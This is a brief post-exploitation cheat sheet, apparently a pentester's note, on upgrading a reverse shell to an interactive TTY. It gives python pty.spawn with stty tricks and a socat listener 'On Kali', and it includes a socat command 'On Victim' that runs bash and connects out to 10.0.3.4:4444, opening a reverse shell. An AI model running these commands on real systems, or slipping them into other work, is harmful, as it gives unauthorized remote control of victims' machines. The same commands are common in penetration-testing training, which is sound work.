# Get-interactive-TTYs
## method 1
# In reverse shell
```python
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```
# In Kali
```bash
$ stty raw -echo
$ fg
```
# In reverse shell
```bash
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```
---
## method 2
**On Kali (listen)**:

<table class="lntable jop-noMdConv" style="box-sizing: border-box; border-spacing: 0px; border-collapse: collapse; background-color: transparent; padding: 0px; margin: 0px; border: 0px; width: auto; overflow: auto; display: block;"><tbody style="box-sizing: border-box;" class="jop-noMdConv"><tr style="box-sizing: border-box; border: none; background-color: #ffffff; margin: 0px; padding: 0px;" class="jop-noMdConv"><td class="lntd jop-noMdConv" style="box-sizing: border-box; padding: 0px; border: 0px; text-align: left; margin: 0px; vertical-align: top;"><pre class="chroma jop-noMdConv" style="box-sizing: border-box; overflow: hidden; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; display: block; padding: 9.5px; margin: 0px; line-height: 1.42857; color: #f8f8f2; word-break: break-all; overflow-wrap: break-word; background-color: #272822; border: none; border-top-left-radius: 4px; border-top-right-radius: unset; border-bottom-right-radius: unset; border-bottom-left-radius: 4px;"><code style="box-sizing: border-box; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; margin-top: 0px; margin-bottom: 0px;" class=""><span class="lnt jop-noMdConv" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; margin-right: 0.4em; padding: 0px 0.4em; color: #7f7f7f;">1
</span></code></pre></td><td class="lntd jop-noMdConv" style="box-sizing: border-box; padding: 0px; border: 0px; text-align: left; margin: 0px; vertical-align: top;"><pre class="chroma jop-noMdConv" style="box-sizing: border-box; overflow: hidden; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; display: block; padding: 9.5px; margin: 0px; line-height: 1.42857; color: #f8f8f2; word-break: break-all; overflow-wrap: break-word; background-color: #272822; border: none; border-radius: unset;"><code class="language-bash" data-lang="bash" style="box-sizing: border-box; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; margin-top: 0px; margin-bottom: 0px;">socat file:<span class="sb jop-noMdConv" style="box-sizing: border-box; margin-top: 0px; color: #e6db74;">`</span>tty<span class="sb jop-noMdConv" style="box-sizing: border-box; color: #e6db74;">`</span>,raw,echo<span class="o jop-noMdConv" style="box-sizing: border-box; color: #f92672;">=</span><span class="m jop-noMdConv" style="box-sizing: border-box; margin-bottom: 0px; color: #ae81ff;">0</span> tcp-listen:4444
</code></pre></td></tr></tbody></table>

**On Victim (launch)**:

<table class="lntable jop-noMdConv" style="box-sizing: border-box; border-spacing: 0px; border-collapse: collapse; background-color: transparent; padding: 0px; margin: 0px; border: 0px; width: auto; overflow: auto; display: block;"><tbody style="box-sizing: border-box;" class="jop-noMdConv"><tr style="box-sizing: border-box; border: none; background-color: #ffffff; margin: 0px; padding: 0px;" class="jop-noMdConv"><td class="lntd jop-noMdConv" style="box-sizing: border-box; padding: 0px; border: 0px; text-align: left; margin: 0px; vertical-align: top;"><pre class="chroma jop-noMdConv" style="box-sizing: border-box; overflow: hidden; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; display: block; padding: 9.5px; margin: 0px; line-height: 1.42857; color: #f8f8f2; word-break: break-all; overflow-wrap: break-word; background-color: #272822; border: none; border-top-left-radius: 4px; border-top-right-radius: unset; border-bottom-right-radius: unset; border-bottom-left-radius: 4px;"><code style="box-sizing: border-box; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; margin-top: 0px; margin-bottom: 0px;" class=""><span class="lnt jop-noMdConv" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; margin-right: 0.4em; padding: 0px 0.4em; color: #7f7f7f;">1
</span></code></pre></td><td class="lntd jop-noMdConv" style="box-sizing: border-box; padding: 0px; border: 0px; text-align: left; margin: 0px; vertical-align: top;"><pre class="chroma jop-noMdConv" style="box-sizing: border-box; overflow: hidden; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; display: block; padding: 9.5px; margin: 0px; line-height: 1.42857; color: #f8f8f2; word-break: break-all; overflow-wrap: break-word; background-color: #272822; border: none; border-radius: unset;"><code class="language-bash" data-lang="bash" style="box-sizing: border-box; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; margin-top: 0px; margin-bottom: 0px;">socat exec:<span class="s1 jop-noMdConv" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; color: #e6db74;">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</code></pre></td></tr></tbody></table>

---
## method 3

<table class="lntable jop-noMdConv" style="box-sizing: border-box; border-spacing: 0px; border-collapse: collapse; background-color: transparent; padding: 0px; margin: 0px; border: 0px; width: auto; overflow: auto; display: block;"><tbody style="box-sizing: border-box;" class="jop-noMdConv"><tr style="box-sizing: border-box; border: none; background-color: #ffffff; margin: 0px; padding: 0px;" class="jop-noMdConv"><td class="lntd jop-noMdConv" style="box-sizing: border-box; padding: 0px; border: 0px; text-align: left; margin: 0px; vertical-align: top;"><pre class="chroma jop-noMdConv" style="box-sizing: border-box; overflow: hidden; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; display: block; padding: 9.5px; margin: 0px; line-height: 1.42857; color: #f8f8f2; word-break: break-all; overflow-wrap: break-word; background-color: #272822; border: none; border-radius: unset;"><code class="language-bash" data-lang="bash" style="box-sizing: border-box; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; margin-top: 0px; margin-bottom: 0px;">python -c <span class="s1 jop-noMdConv" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; color: #e6db74;">'import pty; pty.spawn("/bin/bash")'</span>
</code></pre></td></tr></tbody></table>
